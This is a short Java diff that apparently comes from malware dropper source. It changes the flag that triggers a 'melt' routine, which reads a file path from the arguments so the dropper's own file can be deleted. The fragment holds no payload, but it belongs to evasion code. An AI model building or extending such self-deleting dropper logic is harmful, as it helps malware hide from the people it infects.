@@ -15,7 +15,7 @@ public class MeltDropperStartupModule extends StartupModule {
 		File filetodelete = null;	
 
 		if (Main.args.length > 0) {
-			if (Main.args[0].trim().equals("MELT")) {
+			if (Main.args[0].trim().equals("-melt")) {
 				String path = Main.args[1];
 				filetodelete = new File(path.replace("\"", "").trim());
 			}
